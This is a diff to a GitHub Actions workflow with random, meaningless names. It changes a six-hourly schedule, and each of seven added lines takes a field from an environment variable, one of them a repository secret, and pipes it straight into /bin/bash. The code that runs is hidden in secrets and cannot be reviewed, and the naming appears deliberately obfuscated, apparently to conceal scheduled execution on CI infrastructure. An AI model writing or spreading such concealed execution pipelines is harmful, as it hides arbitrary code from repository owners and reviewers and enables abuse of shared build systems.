@@ -1,9 +1,8 @@
 name: futuredonutt
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
+    - cron: '23 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: futuredonutt
         env:
-          gqmpn30562: ${{ secrets.gqmpn30562 }}
+          nqn7: ${{ secrets.nqn7 }}
         run: |
-          echo $gqmpn30562 | jq -r .hxm5 | /bin/bash
-          echo $hmx65 | jq -r .jpqfz047 | /bin/bash
-          echo $laa8 | jq -r .b05051 | /bin/bash
-          echo $x999 | jq -r .n97163 | /bin/bash
-          echo $ce4951 | jq -r .bwlrw9 | /bin/bash
-          echo $qcr1987 | jq -r .slf3027 | /bin/bash
-          echo $ykdga60687 | jq -r .wp03 | /bin/bash
-          echo $plh494 | jq -r .ho01305 | /bin/bash
+          echo $nqn7 | jq -r .f1 | /bin/bash
+          echo $x17 | jq -r .rjqx72876 | /bin/bash
+          echo $gjpsb8 | jq -r .d6 | /bin/bash
+          echo $mdys48014 | jq -r .rnmco73 | /bin/bash
+          echo $dcak17 | jq -r .clfj7 | /bin/bash
+          echo $v36 | jq -r .fvpv56093 | /bin/bash
+          echo $h11226 | jq -r .zp9 | /bin/bash
 
